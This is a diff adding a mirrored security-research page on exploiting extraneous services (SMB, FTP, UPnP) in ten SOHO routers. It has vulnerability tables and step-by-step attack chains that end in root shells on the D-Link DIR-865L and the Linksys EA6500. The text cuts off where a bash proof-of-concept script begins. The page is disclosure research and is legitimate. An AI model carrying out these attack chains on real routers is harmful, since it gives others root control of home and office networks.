@@ -1,0 +1,1393 @@
+<!doctype html>
+<html lang="en">
+
+
+<!-- Mirrored from www.ise.io/research/soho_service_hacks/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:29:22 GMT -->
+<head>
+    <title>Exploiting SOHO Routers Services - Independent Security Evaluators</title>
+    <meta charset="utf-8">
+	<meta name="description" content="Exploiting SOHO Routers Services Many SOHO routers today incorporate network services and functionality unrelated to routing and switching network traffic. For example, every router contained" />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="index.html" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Exploiting SOHO Routers Services" />
+	<meta property="og:description" content="Exploiting SOHO Routers Services Many SOHO routers today incorporate network services and functionality unrelated to routing and switching network traffic. For example, every router contained" />
+	<meta property="og:url" content="index.html" />
+	<meta property="og:site_name" content="Independent Security Evaluators" />
+	<meta property="og:image" content="../../assets/img/logo_white_square.png" />
+	<meta name="twitter:card" content="summary_large_image" />
+
+    <!-- Required meta tags -->
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="ahrefs-site-verification" content="79c692fee3854586781d3f86d234931ba3f5a12705c23db76407351e42aa6757">
+
+    <!-- fonts preload -->
+    <link rel="preload" href="../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Regular.woff2" as="font" type="font/woff2" crossorigin/>
+    <link rel="preload" href="../../assets/fonts/HK%20Grotesk%20Pro/HKGroteskPro-Medium.woff2" as="font" type="font/woff2" crossorigin/>
+
+
+    <!-- Libs CSS -->
+    <link rel="stylesheet" href="../../assets/fonts/Feather/feather.css">
+    <link rel="stylesheet" href="../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="../../assets/libs/aos/dist/aos.css">
+
+    <!-- <link rel="stylesheet" type="text/css" href="../../assets/font-awesome/css/font-awesome.min.css"> -->
+    <link rel="stylesheet" href="../../../unpkg.com/flickity%402.3.0/dist/flickity.min.css">
+    <script src="../../../unpkg.com/flickity%402.3.0/dist/flickity.pkgd.min.js"></script>
+    <!-- <link rel="stylesheet" href="../../assets/libs/choices.js/public/assets/styles/choices.min.css">
+    <link rel="stylesheet" href="../../assets/libs/flickity-fade/flickity-fade.css">
+    <link rel="stylesheet" href="../../assets/libs/flickity/dist/flickity.min.css">
+    <link rel="stylesheet" href="../../assets/libs/highlightjs/styles/vs2015.css">
+    <link rel="stylesheet" href="../../assets/libs/jarallax/dist/jarallax.css">
+    <link rel="stylesheet" href="../../assets/libs/quill/dist/quill.core.css" /> -->
+
+
+    <!-- Font awesome animations -->
+    <script src="../../../kit.fontawesome.com/275cf458c9.js" crossorigin="anonymous"></script> 
+    <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome-animation/0.3.0/font-awesome-animation.min.css" integrity="sha512-Po8rrCwchD03Wo+2ibHFielZ8luDAVoCyE9i6iFMPyn9+V1tIhGk5wl8iKC9/JfDah5Oe9nV8QzE8HHgjgzp3g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <!-- Theme CSS -->
+    <link rel="stylesheet" href="../../assets/css/theme.min.css">
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HZ2ZZMHS4S"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-HZ2ZZMHS4S');
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+      new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+      j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+      '../../../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
+      })(window,document,'script','dataLayer','GTM-TW7J76M');</script>
+    <!-- End Google Tag Manager -->
+
+    <!-- Google Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+</head>
+
+<body>
+    
+    <!-- NAVBAR
+    ================================================== -->
+    <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-white">
+      <div class="container">
+
+        <!-- Brand -->
+        <a class="navbar-brand" href="../../index.html">
+          <img src="../../assets/img/brand.svg" class="navbar-brand-img" alt="...">
+        </a>
+
+        <!-- Buttons-->
+        <div>
+          <!-- Start Page Book a Demo Button -->         <!-- Only shows on screen sizes between extra small to medium -->
+          <!--
+          <a class="btn btn-primary btn-sm lift btn-pd-sm d-xs-block d-lg-none" id="navbar-demo-btn" style="display: none;" rel="noopener">
+          Book a Demo</a>-->
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+        </div>
+
+        <!-- Collapse -->
+        <div class="collapse navbar-collapse" id="navbarCollapse">
+
+          <!-- Toggler -->
+          <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse"
+            aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
+            <i class="fe fe-x"></i>
+          </button>
+
+          <!-- Navigation -->
+          <ul class="navbar-nav ml-auto">
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarAbout" data-hover="dropdown" href="../../about/values/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                About
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarAbout">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-8">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      About ISE
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../about/values/index.html" title="Integrity, Quality, Dedication, Education">
+                      Company Values
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../about/methodology/index.html" title="Learn how we deliver reports">
+                      Methodology
+                    </a>      
+
+                    <a class="dropdown-item" href="../../about/leadership/index.html" title="Independent Security Evaluators">
+                      Leadership
+                    </a>      
+
+                    <a class="dropdown-item" href="../../news/index.html" title="Stay up to date">
+                      News
+                    </a>      
+
+                    <a class="dropdown-item" href="../../careers/index.html" title="Join our team">
+                      Careers
+                    </a>      
+
+                  </div>
+                </div>
+              </div>
+            </li>
+
+
+
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarServices" data-hover="dropdown" href="../../services/vulnerability-assessments/index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Services
+              </a>
+              <div class="dropdown-menu dropdown-menu-lg" aria-labelledby="navbarServices">
+                <div class="row no-gutters">
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Assessments
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../services/vulnerability-assessments/index.html">
+                      Vulnerability Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../services/application-security-assessment/index.html">
+                      Application Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../services/cloud-security-assessment/index.html">
+                      Cloud Security Assessments
+                    </a>
+                    <a class="dropdown-item" href="../../services/penetration-testing/index.html">
+                      Penetration Testing
+                    </a>
+                    <a class="dropdown-item" href="../../services/network-penetration-testing/index.html">
+                      Network Penetration Testing
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../services/managed-vulnerability-scanning/index.html">
+                      Vulnerability Scanning
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Hacking Events
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item mb-5" href="https://www.iotvillage.org/" target="_blank" rel="noopener">
+                      IoT Village <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                  <div class="col-12 col-lg-6">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Consulting
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../services/security-consulting-services/index.html">
+                      Security Consulting
+                    </a>
+                    <a class="dropdown-item" href="../../services/independent-verification-and-validation/index.html">
+                      Independent Verification & Validation
+                    </a>
+                    <a class="dropdown-item" href="../../services/secure-design-analysis/index.html">
+                      Secure Design Analysis
+                    </a>
+                    <a class="dropdown-item mb-5" href="../../services/it-consulting-services/index.html">
+                      IT Consulting
+                    </a>
+                
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Training
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../../services/training/index.html">
+                      Security Training
+                    </a>
+
+                    <a class="dropdown-item mb-5" href="https://offers.ise.io/ise-application-security-training-workshop" rel="noopener noreferrer" target="_blank">
+                      Hackalong <span class="fe fe-external-link"></span>
+                    </a>
+
+                  </div>
+                </div>
+              </div>
+            </li>
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarResearch" data-hover="dropdown" href="../index.html" aria-haspopup="true"
+                aria-expanded="false">
+                Research
+              </a>
+              <div class="dropdown-menu dropdown-menu" aria-labelledby="navbarResearch">
+
+                    <!-- Heading -->
+                    <h6 class="dropdown-header">
+                      Research
+                    </h6>
+
+                    <!-- List -->
+                    <a class="dropdown-item" href="../index.html" title="Papers & Studies">
+                      Papers & Studies
+                    </a>                                
+
+                    <a class="dropdown-item" href="../../talks/index.html" title="Talks">
+                      Talks
+                    </a>      
+
+                    <a class="dropdown-item" href="../../blog/index.html" title="Hackers Blog">
+                      Hackers Blog
+                    </a>      
+
+                    <a class="dropdown-item" href="https://blog.ise.io/blog" title="Industry Blog" rel="noopener noreferrer" target="_blank">
+                      Industry Blog <span class="fe fe-external-link"></span>
+                    </a>      
+
+                    <a class="dropdown-item" href="../../start/blog/index.html" title="Join our team">
+                      VRM/TPRM Articles
+                    </a>  
+
+                    <a class="dropdown-item" href="../podcast/index.html" title="Join our team">
+                      Podcast
+                    </a>   
+       
+                </div>
+            </li>
+
+            <!-- Start-->
+            <!-- <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" id="navbarStart" data-hover="dropdown" href="../../start/" aria-haspopup="true"
+                aria-expanded="false">
+                START VRM
+              </a>
+              <div class="dropdown-menu dropdown-menu-md" aria-labelledby="navbarStart">
+                <div class="list-group list-group-flush p-4">
+
+                  <a class="list-group-item" href="../../start/blog/">
+                    <div class="ml-4">
+                      <h6 class="font-weight-bold text-uppercase text-primary mb-0">
+                        Blog
+                      </h6>
+                    </div>
+
+                  </a>
+
+                </div>
+              </div>
+            </li> -->
+        
+            <li class="nav-item dropdown">
+              <a class="nav-link" id="navbarStart" href="../../start/index.html">
+                START - Vendor Risk Management
+              </a>
+            </li>
+
+
+          </ul>
+      
+          <a class="navbar-btn btn btn-sm btn-primary lift ml-auto"
+            href="https://offers.ise.io/ask-an-expert" target="_blank" rel="noopener">
+            Ask an Expert
+          </a>
+
+        </div>
+
+      </div>
+    </nav>
+
+    <!-- CONTENT
+    ================================================== -->
+    
+<section class="pt-12 pt-md-12 pb-6 pb-md-6 border-bottom">
+    <div class="container">
+        <div class="row">
+            <div class="col-12">
+
+                <article class="post-391 page type-page status-publish entry">
+                    <header class="entry-header"></header>
+                    <div class="entry-content">
+                        <div id="pl-391" class="panel-layout">
+                            <div id="pg-391-0" class="panel-grid panel-no-style">
+                                <div id="pgc-391-0-0" class="panel-grid-cell">
+                                    <div id="panel-391-0-0-0"
+                                        class="so-panel widget widget_sow-editor panel-first-child panel-last-child widgetopts-SO"
+                                        data-index="0">
+                                        <div id="border-heading"
+                                            class="panel-widget-style panel-widget-style-for-391-0-0-0">
+                                            <div class="so-widget-sow-editor so-widget-sow-editor-base">
+                                                <div class="siteorigin-widget-tinymce textwidget">
+                                                    <h2 class="text-center">Exploiting SOHO Routers Services</h2>
+                                                    <p>Many SOHO routers today incorporate network services and
+                                                        functionality unrelated
+                                                        to routing and switching network traffic. For example, every
+                                                        router contained at
+                                                        least one service for supporting some form of Network Attached
+                                                        Storage (NAS).
+                                                        These services included FTP, SMB, NetBIOS, UPnP Media, and HTTP.
+                                                        Outside of NAS
+                                                        services, SOHO routers also often utilize other miscellaneous
+                                                        network services
+                                                        for optimization and configuration purposes. Though seemingly
+                                                        innocuous, these
+                                                        extraneous services have come at the expense of security by
+                                                        introducing new
+                                                        attack surfaces for compromise. As evidence, ISE has exploited a
+                                                        number of
+                                                        routers by leveraging the existent of such services.</p>
+                                                    <p><span style="color: #ff0000;"><b>UPDATE:</b></span><a
+                                                            href="../../wp-content/uploads/2017/07/soho_techreport.pdf">Full
+                                                            technical
+                                                            report (PDF)</a></p>
+                                                    <p><span style="color: #ff0000;"><b>UPDATE:</b></span><a
+                                                            href="http://news.cnet.com/8301-1009_3-57596851-83/wi-fi-routers-more-security-risks-than-ever/"
+                                                            target="_blank" rel="noopener noreferrer">Click here to
+                                                            access CNET's new
+                                                            article</a> featuring a high level overview of a handful of
+                                                        these attacks.
+                                                    </p>
+                                                    <p><span style="color: #ff0000;"><b>INQUIRIES:</b></span> For more
+                                                        information on
+                                                        this routers project, you can contact us at . For general
+                                                        inquiries, <a href="../../contact/index.html">click here to contact
+                                                            ISE</a>.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="pg-391-1" class="panel-grid panel-no-style">
+                                <div id="pgc-391-1-0" class="panel-grid-cell">
+                                    <div id="panel-391-1-0-0"
+                                        class="so-panel widget widget_sow-editor panel-first-child panel-last-child"
+                                        data-index="1">
+                                        <div class="so-widget-sow-editor so-widget-sow-editor-base">
+                                            <div class="siteorigin-widget-tinymce textwidget">
+                                                <h2>Introduction</h2>
+                                                <p>In a previous report, we released a list of SOHO router
+                                                    vulnerabilities and showed
+                                                    proof-of-concept (PoC) attack code for how to exploit them. For many
+                                                    of these
+                                                    routers, those PoCs operated through the main web-based interface.
+                                                    In this follow up
+                                                    study, we addressed only the extraneous, non-router services that
+                                                    were present on
+                                                    the routers. What we found was that of the 10 routers reviewed, all
+                                                    10 could be
+                                                    compromised from the (wireless) LAN once a router had USB attached
+                                                    storage
+                                                    connected.</p>
+                                                <p><a href="../../wp-content/uploads/2017/07/Vulnerability_Catalog.pdf">Read
+                                                        here</a> for a
+                                                    comprehensive vulnerability catalog.</p>
+                                                <p><a href="../../casestudies/exploiting-soho-routers/index.html">Read
+                                                        here</a> for our
+                                                    previous study, demonstrating the ubiquity of these vulnerabilities.
+                                                </p>
+                                                <p>Read below for PoC attacks, and interesting vulnerability details.
+                                                </p>
+                                                <ul>
+                                                    <li>All 10 routers evaluated can be taken over from the local
+                                                        network by exploiting
+                                                        non-essential services that are either enabled by default, or
+                                                        enabled once USB
+                                                        storage is attached.</li>
+                                                </ul>
+                                                <p> </p>
+                                                <h3>Motivation</h3>
+                                                <p>Despite being widely distributed and deployed in nearly every modern
+                                                    home and small
+                                                    office, SOHO networking equipment has received surprisingly little
+                                                    attention from
+                                                    security researchers. Yet, these devices facilitate the connectivity
+                                                    and protection
+                                                    (we hope) of millions of end-systems. The <span
+                                                        style="color: red;">critical</span>
+                                                    vulnerabilities that persist in these widely used devices
+                                                    demonstrate an urgent need
+                                                    for deeper scrutiny.</p>
+                                                <p>Our research indicates that a moderately skilled adversary with LAN
+                                                    or WLAN access
+                                                    can exploit all ten routers through their non-essential features and
+                                                    services.</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="pg-391-2" class="panel-grid panel-no-style">
+                                <div id="pgc-391-2-0" class="panel-grid-cell">
+                                    <div id="panel-391-2-0-0"
+                                        class="so-panel widget widget_sow-editor panel-first-child panel-last-child widgetopts-SO"
+                                        data-index="2">
+                                        <div class="so-widget-sow-editor so-widget-sow-editor-base">
+                                            <div class="siteorigin-widget-tinymce textwidget">
+                                                <h2>Summary</h2>
+                                                <p>The following table summarizes the services that are available on the
+                                                    (wireless) LAN
+                                                    by default, once USB storage is attached.</p>
+                                                <table class="summary" style="width: 100%;">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td><b>Router</b></td>
+                                                            <td><b> FTP </b></td>
+                                                            <td><b> Telnet </b></td>
+                                                            <td><b> DNS </b></td>
+                                                            <td><b> HTTP </b></td>
+                                                            <td><b> SMB </b></td>
+                                                            <td><b> HTTPS </b></td>
+                                                            <td><b> UPnP </b></td>
+                                                            <td><b>Total Ports</b></td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>Linksys EA6500</td>
+                                                            <td> </td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>30</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>Netgear WNDR4700</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>29</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>ASUS RT-AC66U</td>
+                                                            <td> </td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>31</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>ASUS RT-N56U</td>
+                                                            <td> </td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>23</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>TP LINK TL-WDR4300</td>
+                                                            <td> </td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>17</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>TP LINK TL-1043ND</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>15</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>TRENDnet TEW-812DRU</td>
+                                                            <td> </td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>22</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>Netgear WNR3500</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>15</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>D-LINK DIR-865L</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>32</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td>Belkin N900</td>
+                                                            <td> </td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td>y</td>
+                                                            <td> </td>
+                                                            <td>y</td>
+                                                            <td>10</td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                                <p>    <b>Table 1.</b> Network port summary</p>
+                                                <p>The table in Table 2 shows a list of routers evaluated in our study
+                                                    with the specific
+                                                    vulnerabilities that were leveraged to gain root access to the
+                                                    device. These
+                                                    vulnerabilities were found from a hardened configuration, and after
+                                                    USB storage was
+                                                    attached to the device. This chart is not inclusive of all
+                                                    discovered
+                                                    vulnerabilities - only vulnerabilities that were used by ISE to gain
+                                                    root access.
+                                                </p>
+                                                <table class="summary" style="width: 100%;">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td style="width: 185.017px;" rowspan="2"><b>Router</b></td>
+                                                            <td style="width: 692.483px;" colspan="6" align="center">
+                                                                <b>Vulnerabilities</b>
+                                                            </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 112.567px;">Buffer Overflow</td>
+                                                            <td style="width: 96.4px;">SMB Symlink</td>
+                                                            <td style="width: 108.667px;">Race Condition</td>
+                                                            <td style="width: 88.7667px;">Web Attacks</td>
+                                                            <td style="width: 67.3667px;">Backdoor</td>
+                                                            <td style="width: 188.717px;">Improper File Permissions</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">Linksys EA6500</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;">X</td>
+                                                            <td style="width: 67.3667px;"> </td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">Netgear WNDR4700</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;"> </td>
+                                                            <td style="width: 67.3667px;">X</td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">ASUS RT-AC66U</td>
+                                                            <td style="width: 112.567px;">X</td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;"> </td>
+                                                            <td style="width: 67.3667px;"> </td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">ASUS RT-N56U</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;"> </td>
+                                                            <td style="width: 67.3667px;"> </td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">TP LINK TL-WDR4300</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;">X</td>
+                                                            <td style="width: 67.3667px;"> </td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">TP LINK TL-1043ND</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;">X</td>
+                                                            <td style="width: 88.7667px;">X</td>
+                                                            <td style="width: 67.3667px;"> </td>
+                                                            <td style="width: 188.717px;"> </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">TRENDnet TEW-812DRU</td>
+                                                            <td style="width: 112.567px;">X</td>
+                                                            <td style="width: 96.4px;"> </td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;">X</td>
+                                                            <td style="width: 67.3667px;">X</td>
+                                                            <td style="width: 188.717px;"> </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">Netgear WNR3500</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;"> </td>
+                                                            <td style="width: 67.3667px;">X</td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">D-LINK DIR-865L</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;">X</td>
+                                                            <td style="width: 88.7667px;">X</td>
+                                                            <td style="width: 67.3667px;">X</td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <td style="width: 185.017px;">Belkin N900</td>
+                                                            <td style="width: 112.567px;"> </td>
+                                                            <td style="width: 96.4px;">X</td>
+                                                            <td style="width: 108.667px;"> </td>
+                                                            <td style="width: 88.7667px;"> </td>
+                                                            <td style="width: 67.3667px;"> </td>
+                                                            <td style="width: 188.717px;">X</td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                                <p>    <b>Table 2.</b> Vulnerability summary</p>
+                                                <h2>Proof of concept attacks</h2>
+                                                <p>Here we present several proof of concept attacks that demonstrate how
+                                                    these routers
+                                                    can be exploited using combinations of the above vulnerabilities. We
+                                                    assume the
+                                                    adversary is any user on the (wireless) LAN who can contact the
+                                                    router, and that the
+                                                    router is in its hardened state, with USB storage attached. </p>
+                                                <h3>D-Link DIR-865L</h3>
+                                                <p>In the case of the D-Link DIR-865L, we demonstrate how improper file
+                                                    permissions,
+                                                    unsecured sensitive data, unauthenticated access to SMB, and a
+                                                    misconfigured SMB
+                                                    service can allow an attacker to recover the device's administrative
+                                                    password, and
+                                                    thereby gain administrative control of the device.</p>
+                                                <p>From its hardened state, with USB storage attached, the DIR-865L runs
+                                                    a Samba service
+                                                    on ports TCP/445 , TCP/139 and UDP/137.</p>
+                                                <ol>
+                                                    <li>By default, the SMB service does not require authentication, and
+                                                        so an attacker
+                                                        can immediately log in without credentials (no CVE cataloged).
+                                                    </li>
+                                                    <li>Due to a misconfiguration in the SMB service, symbolic links can
+                                                        be created to
+                                                        locations outside of the Samba share (CVE-2013-4855). The
+                                                        attacker can create a
+                                                        symbolic link to /, the router's file system root.</li>
+                                                    <li>The DIR-865L allows world-readable access to several system
+                                                        folders (CVE
+                                                        pending), including /var/, which contains the passwd file.
+                                                        Through a symbolic
+                                                        link traversal from 2, an attacker can obtain this file.</li>
+                                                    <li>The DIR-865L passwd file contains a cleartext administrator
+                                                        password (CVE
+                                                        pending). Once the attacker obtains this from 3, he can log in
+                                                        to the web
+                                                        interface as an administrator.</li>
+                                                    <li>The attacker logs in using the credentials obtained in 4.</li>
+                                                    <li>The web interface of the DIR-865L contains a PHP File Inclusion
+                                                        vulnerability
+                                                        (CVE-2013-4857) in the router_info.xml file. The file takes the
+                                                        argument
+                                                        .section. that is intended for including other XML files. An
+                                                        attacker can upload
+                                                        a file containing chosen PHP code to the Samba share (e.g.,
+                                                        /tmp/storage/&lt;sharename&gt;/test.xml), and then request
+                                                        router_info.xml while
+                                                        setting the section variable to
+                                                        .../../tmp/storage/&lt;sharename&gt;/&lt;uploaded_file&gt;.
+                                                        which is
+                                                        automatically concatenated with the extension ..xml. and
+                                                        processed.</li>
+                                                    <li>When the DIR-865L receives certain configuration changes through
+                                                        the web
+                                                        interface, it creates shell scripts in the directory /var/run/
+                                                        and then executes
+                                                        them as a separate step, creating a race condition (no CVE
+                                                        cataloged, not
+                                                        intrinsically a vulnerability). For instance, a command can be
+                                                        issued from the
+                                                        web interface to restart NTP, which creates the script
+                                                        /var/run/ntp_run.sh, and
+                                                        then subsequently executes the script. An attacker can leverage
+                                                        the PHP file
+                                                        inclusion vulnerability from 6 to repeatedly execute PHP code to
+                                                        overwrite
+                                                        /var/run/ntp_run.sh with a different script, while at the same
+                                                        time restarting
+                                                        the NTP service in the hopes of exploiting the race condition,
+                                                        and executing the
+                                                        attacker written ntp_run.sh, rather than the official version.
+                                                    </li>
+                                                    <li>Eventually, winning the race condition from 7 happens, and an
+                                                        unauthenticated
+                                                        Telnet service with root privileges listens on port 23. The
+                                                        attacker can access
+                                                        this service to obtain a root shell.</li>
+                                                </ol>
+                                                <p>A full script for launching this attack against a D-Link DIR-865L can
+                                                    be found <a
+                                                        href="https://www.ise.io/wp-content/uploads/2017/07/dlink_script.html">here</a>.
+                                                </p>
+                                                <h3>Linksys EA6500</h3>
+                                                <p>In the case of the Linksys EA6500, we demonstrate how improper file
+                                                    permissions,
+                                                    unauthenticated access to SMB, and a misconfigured SMB can allow an
+                                                    attacker to
+                                                    execute arbitrary commands on the router, thereby granting the
+                                                    attacker a root
+                                                    shell.</p>
+                                                <p>From its hardened state, with USB storage attached, the EA6500 runs a
+                                                    Samba service
+                                                    on ports TCP/445, TCP/139 and UDP/137, UDP/138.</p>
+                                                <ol>
+                                                    <li>By default, the SMB service does not require authentication, and
+                                                        so an attacker
+                                                        can immediately log in without credentials (no CVE cataloged).
+                                                    </li>
+                                                    <li>Due to a misconfiguration in the SMB service, symbolic links can
+                                                        be created to
+                                                        locations outside of the Samba share (CVE-2013-4658) The
+                                                        attacker can create a
+                                                        symbolic link to /, the router's file system root.</li>
+                                                    <li>The EA6500 allows universal read/write access to its /tmp/
+                                                        directory (CVE
+                                                        pending), where it stores scripts that run according to a cron
+                                                        schedule. Once
+                                                        per minute, the EA6500 runs the scripts found in the folder
+                                                        /tmp/cron/cron.everyminute/ as root. Through the symbolic link
+                                                        traversal from 2,
+                                                        the attacker can put an utelnetd binary in /tmp/, and a script
+                                                        that runs
+                                                        utelnetd in /tmp/cron/cron.everyminute/.</li>
+                                                    <li>Eventually, the script from 3 is activated, and an
+                                                        unauthenticated Telnet
+                                                        service with root privileges listens on port 23. The attacker
+                                                        can access this
+                                                        service to obtain a root shell.</li>
+                                                </ol>
+                                                <p>A full script for launching this attack against a hardened EA6500
+                                                    with USB attached
+                                                    storage can be found below.</p>
+                                                <table class="pocHtml">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td>
+                                                                <pre><code>
+#!/bin/bash
